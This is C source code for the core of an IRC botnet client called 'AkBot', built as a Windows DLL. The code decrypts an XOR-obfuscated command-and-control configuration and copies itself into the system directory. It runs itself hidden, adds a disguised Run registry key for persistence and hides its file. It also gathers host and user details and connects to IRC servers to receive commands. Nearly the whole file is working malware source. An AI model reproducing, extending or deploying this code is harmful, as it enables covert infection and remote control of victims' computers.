/* AkBot v0.4.5 Spamk */

#include "include.h"
#include "config.h"

char botid[128];
char server[16][128];
char port[128];
char serverpass[128];
char channel[128];
char chankey[128];
char hostauth[128];
char scanchan[128];
char filename[128];

int transfers = 0;
int emails_sent = 0;
char dllname[256];
char local_ip[16];
char global_ip[16];
char global_host[128];
struct threads thread[512];
struct ircs irc;
bool mail_done = false;
bool transfer_info = false;
bool scan_active = false;
bool socks4_active = false;
bool httpd_active = false;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if(fdwReason != DLL_PROCESS_ATTACH)
		return TRUE;
	GetModuleFileName(hinstDLL, dllname, sizeof(dllname));
	return TRUE;
}

extern "C" _declspec(dllexport)

void start()
/* main function */
{
	int nt;
	int tok;
	int len;
	char recvbuf[4096];
	char line[512];
	char line2[512];
	char oldline[512];
	WSADATA wsa;
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	srand(GetTickCount());
	decryptconfig();
	syscopy();
	clearthreadall();
	if(WaitForSingleObject(CreateMutex(0, FALSE, botid), 30000) == WAIT_TIMEOUT)
		return;
	memset(local_ip, 0, sizeof(local_ip));
	memset(global_ip, 0, sizeof(global_ip));
	memset(global_host, 0, sizeof(global_host));
	memset(oldline, 0, sizeof(oldline));
	if(WSAStartup(MAKEWORD(2, 2), &wsa))
		return;
	netinfo();
	while(!irc_connect())
		Sleep(5000);
	while(1)
	{
		if((len = recv(irc.sock, recvbuf, sizeof(recvbuf), 0)) <= 0)
		{
			Sleep(5000);
			while(!irc_connect())
				Sleep(5000);
			continue;
		}
		recvbuf[len] = '\0';
		nt = numtok(recvbuf, '\n');
		for(tok = 0; tok < nt; tok++)
		{
			strncpy(line, gettok(recvbuf, tok + 1, '\n'), sizeof(line));
			if(oldline[0])
			{
				_snprintf(line2, sizeof(line2), "%s%s", oldline, line);
				strncpy(line, line2, sizeof(line));
				memset(oldline, 0, sizeof(oldline));
			}
			if(line[strlen(line)-1] != '\r')
			{
				strncpy(oldline, line, sizeof(oldline));
				continue;
			}
			line[strlen(line)-1] = '\0';
			irc_parse(line);
		}
	}
}

int numtok(const char *str, char chr)
/* counts tokens in a string, using chr as the delimiter */
{
	int i;
	int tc;
	bool in_tok;
	for(i = 0, tc = 0, in_tok = false; str[i] != '\0'; i++)
	{
		if(in_tok && str[i] == chr)
			in_tok = false;
		else if(!in_tok && str[i] != chr)
		{
			in_tok = true;
			tc++;
		}
	}
	return tc;
}

int rrand(int min, int max)
/* easier way of using rand() */
{
	if(min == max)
		return min;
	return rand() % (max - min + 1) + min;
}

int cpuspeed()
/* gets cpu speed */
{
	unsigned __int64 startcycle;
	unsigned __int64 speed;
	unsigned __int64 num;
	unsigned __int64 num2;
	startcycle = cyclecount();
	Sleep(1000);
	speed = ((cyclecount() - startcycle) / 100000) / 10;
	num = speed % 100;
	num2 = 100;
	if(num < 80)
		num2 = 75;
	if(num < 71)
		num2 = 66;
	if(num < 55)
		num2 = 50;
	if(num < 38)
		num2 = 33;
	if(num < 30)
		num2 = 25;
	if(num < 10)
		num2 = 0;
	speed = (speed - num) + num2;
	return (int)speed;
}

unsigned long resolvehost(const char *host)

/* resolves a hostname to a ip address */
{
	struct hostent *he;
	if(!(he = gethostbyname(host)))
		return 0;
	return (*(struct in_addr *)he->h_addr).s_addr;
}

#pragma warning(disable : 4035)
unsigned __int64 cyclecount()
/* gets cpu cycle count */
{
	__asm
	{
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning(default : 4035)

char *gettok(const char *str, int tok, char chr)
/* gets a token from a string, using chr as the delimiter */
{
	int i;
	int l;
	int t;
	int tc;
	bool in_tok;
	char s[32][512];
	char *p;
	for(i = 0, l = 0, t = 0, tc = 0, in_tok = false; str[i] != '\0' && t < 32; i++)
	{
		if(in_tok && str[i] == chr)
		{
			in_tok = false;
			s[t][l] = '\0';
		}
		else if(!in_tok && str[i] != chr)
		{
			in_tok = true;
			tc++;
			if(tc > 1)
				t++;
			l = 0;
			s[t][l++] = str[i];
		}
		else if(in_tok && str[i] != chr)
			s[t][l++] = str[i];
	}
	s[t][l] = '\0';
	p = s[tok-1];
	return p;
}

char *resolveip(unsigned long ip)
/* resolves an ip to a hostname */
{
	struct hostent *he;
	if(!(he = gethostbyaddr((char *)&ip, 4, AF_INET)))
		return 0;
	return he->h_name;
}

char *sysinfo()
/* gets general system information */
{
	unsigned long total;
	char szBuffer[MAX_COMPUTERNAME_LENGTH+1];
	char os2[128];
	char sysdir[256];
	char *szCompname;
	char *os;
	char *buf = (char *)malloc(256);
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GlobalMemoryStatus(&memstat);
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	if(verinfo.dwMajorVersion == 4 && !verinfo.dwMinorVersion)
	{
		if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
			os = "95";
		else if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
			os = "NT";
	}
	else if(verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10)
		os = "98";
	else if(verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90)
		os = "ME";
	else if(verinfo.dwMajorVersion == 5 && !verinfo.dwMinorVersion)
		os = "2000";
	else if(verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1)
		os = "XP";
	else
		os = "???";
	if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0])
	{
		_snprintf(os2, sizeof(os2), "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}
	total = GetTickCount() / 1000;
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);
	_snprintf(buf, 256, "OS: Windows %s (%d.%d - %d), CPU: %dMHz, RAM: %d/%dMB free, box: %s, user: %s, sysdir: %s, uptime: %lud %luh %lum",
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber,
		cpuspeed(), memstat.dwAvailPhys / 1048576, memstat.dwTotalPhys / 1048576,
		szCompname, szUserName, sysdir, total / 86400, (total % 86400) / 3600, (total % 86400 % 3600) / 60);
	return buf;
}

char *netinfo()
/* gets general network information */
{
	char *buf = (char *)malloc(256);
	_snprintf(buf, 256, "IP: %s, connected from: %s (%s)", local_ip, global_ip, global_host);
	return buf;
}

bool isip(const char *address)
/* returns true if it is an ip and false if it isn't */
{
	int a;
	int b;
	int c;
	int d;
	sscanf(address, "%d.%d.%d.%d", &a, &b, &c, &d);
	if(a >= 0 && a <= 255)
	{
		if(b >= 0 && b <= 255)
		{
			if(c >= 0 && c <= 255)
			{
				if(d >= 0 && d <= 255)
					return true;
			}
		}
	}
	return false;
}

void *makethread(unsigned int (__stdcall *start)(void *), void *arg)
/* easy way of using _beginthreadex() */
{
	return (void *)_beginthreadex(0, 0, start, arg, 0, 0);
}

void localip()
/* gets the local ip address of the system */
{
	int sas;
	struct sockaddr sa;
	sas = sizeof(sa);
	getsockname(irc.sock, &sa, &sas);
	_snprintf(local_ip, sizeof(local_ip), "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
}

void syscopy()
/* copy DLL to system directory and make it auto start */
{
	char sysdir[256];
	char fname[256];
	char buf[256];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(fname, sizeof(fname), "%s\\%s", sysdir, filename);
	if(!stricmp(fname, dllname))
		return;
	while(!CopyFile(dllname, fname, FALSE))
		Sleep(2000);
	autostart();
	_snprintf(buf, sizeof(buf), "%s,start", fname);
	ShellExecute(0, "open", "rundll32.exe", buf, 0, SW_HIDE);
	uninstall();
}

void autostart()
/* add registry key for auto start */
{
	char val[128];
	char sysdir[256];
	char fname[256];
	char buf[256];
	HKEY key;
	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(val, sizeof(val), "WinDLL (%s)", filename);
	_snprintf(fname, sizeof(fname), "%s\\%s", sysdir, filename);
	_snprintf(buf, sizeof(buf), "rundll32.exe %s,start", fname);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &key, 0);
	RegSetValueEx(key, val, 0, REG_SZ, (unsigned char *)buf, strlen(buf));
	RegCloseKey(key);
	SetFileAttributes(fname, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
}

void uninstall()
/* remove the DLL and registry key */
{
	unsigned long w;
	char fname[256];
	char batfile[256];
	char sysdir[256];
	char tempdir[256];
	char fbuf[1024];
	HANDLE file;
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetTempPath(sizeof(tempdir), tempdir);
	_snprintf(fname, sizeof(fname), "%s\\%s", sysdir, filename);
	_snprintf(batfile, sizeof(batfile), "%suninstall.bat", tempdir);
	if(!stricmp(fname, dllname))
	{
		char val[128];
		HKEY key;
		_snprintf(val, sizeof(val), "WinDLL (%s)", filename);
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &key, 0);
		RegDeleteValue(key, val);
		SetFileAttributes(fname, FILE_ATTRIBUTE_NORMAL);
	}
	_snprintf(fbuf, sizeof(fbuf), "@echo off\r\n"
		":1\r\n"
		"del \"%s\"\r\n"
		"if exist \"%s\" goto 1\r\n"
		"del \"%s\"\r\n",
		dllname, dllname, batfile);
	file = CreateFile(batfile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	WriteFile(file, fbuf, strlen(fbuf), &w, 0);
	CloseHandle(file);
	ShellExecute(0, "open", batfile, 0, 0, SW_HIDE);
	exit(0);
}

void decryptconfig()
/* decrypt the settings */
{
	int i;
	decrypt(botid, sizeof(botid), e_botid, cryptkey);
	decrypt(port, sizeof(port), e_port, cryptkey);
	decrypt(serverpass, sizeof(serverpass), e_serverpass, cryptkey);
	decrypt(channel, sizeof(channel), e_channel, cryptkey);
	decrypt(chankey, sizeof(chankey), e_chankey, cryptkey);
	decrypt(hostauth, sizeof(hostauth), e_hostauth, cryptkey);
	decrypt(scanchan, sizeof(scanchan), e_scanchan, cryptkey);
	decrypt(filename, sizeof(filename), e_filename, cryptkey);
	for(i = 0; e_server[i][0]; i++)
		decrypt(server[i], sizeof(server[i]), e_server[i], cryptkey);
	server[i][0] = 0;
}

void decrypt(char *buf, int bufsiz, const char *str, const char *key)
/* decrypts a string with XOR encryption and stores the output in buf */
{
	int x;
	int i;
	int k;
	int keylen = strlen(key);
	unsigned char len = str[0];
	for(x = 0; x < len; x++)
		buf[x] = str[x+1];
	for(k = 0; k < keylen; k++)
	{
		for(i = 0; i < len; i++)
		{
			if(i >= bufsiz)
				break;
			buf[i] ^= key[k];
		}
	}
	buf[len] = '\0';
}

void encrypt(char *buf, int bufsiz, const char *str, const char *key)
/* encrypts a string with XOR encryption and stores the output in buf */
{
	int i;
	int k;
	int keylen = strlen(key);
	unsigned char len = strlen(str);
	buf[0] = len;
	strncpy(buf + 1, str, bufsiz);
	for(k = 0; k < keylen; k++)
	{
		for(i = 1; i <= len; i++)
		{
			if(i >= bufsiz)
				break;
			buf[i] ^= key[k];
		}
	}
}
